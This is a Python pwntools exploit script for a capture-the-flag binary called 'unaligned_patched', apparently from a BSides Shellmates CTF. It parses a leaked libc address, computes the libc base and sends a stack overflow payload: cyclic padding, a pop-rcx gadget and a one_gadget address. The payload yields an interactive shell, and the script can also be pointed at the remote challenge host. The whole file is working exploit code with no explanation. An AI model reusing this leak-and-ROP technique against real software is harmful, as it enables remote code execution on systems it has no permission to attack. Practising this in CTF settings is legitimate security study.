#!/usr/bin/python3
from pwn import *
from pwn import remote


elf = context.binary = ELF("unaligned_patched")
libc = elf.libc

local = True 
if local:
    p = process("./unaligned_patched")
    gdb.attach(p,'''''')
else:
    p = remote('sys-rop.bsides.shellmates.club', 443)

elf = context.binary = ELF('./unaligned_patched', checksec=False)

p.recvuntil(b"Gift: 0x")

libc_base = int(p.recv(12),16) - 324640

rcx_ret = libc_base + 0x00000000000e433e
og_1 = 0x4f2a5+ libc_base
print("[+]Libc_base:    ", hex(libc_base))

payload = cyclic(0x28) + p64(rcx_ret) + p64(0x0) + p64(og_1)
p.sendlineafter(b"Name:", payload)
p.interactive()